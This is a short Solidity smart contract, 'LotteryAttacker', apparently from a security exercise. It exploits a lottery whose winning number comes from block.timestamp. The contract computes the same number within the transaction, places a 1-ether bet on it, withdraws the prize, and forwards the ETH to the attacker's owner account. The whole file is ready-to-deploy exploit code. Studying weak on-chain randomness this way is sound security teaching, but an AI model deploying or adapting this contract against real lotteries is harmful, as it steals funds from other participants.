// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface ILottery {
  function placeBet(uint8 _number) external payable;
  function withdrawPrize() external;
}

contract LotteryAttacker is Ownable {
  using Address for address payable;

  ILottery public immutable lottery;

  constructor(address _lottery) {
    lottery = ILottery(_lottery);
  }

  function attack() external payable onlyOwner {
    uint8 winningNumber = getWinningNumber();
    // Execute placeBet() passing the winningNumber as argument, and sending the required fee (1 ether) to participate in the lottery
    lottery.placeBet{ value: 1 ether }(winningNumber);
  }

  function getWinningNumber() private view returns (uint8) {
    return uint8(uint256(keccak256(abi.encode(block.timestamp))) % 254) + 1;
  }

  function claimReward() external onlyOwner {
    lottery.withdrawPrize();
  }

  receive() external payable {
    // Immediately send the ETHs to the attacker's account
    payable(owner()).sendValue(address(this).balance);
  }

}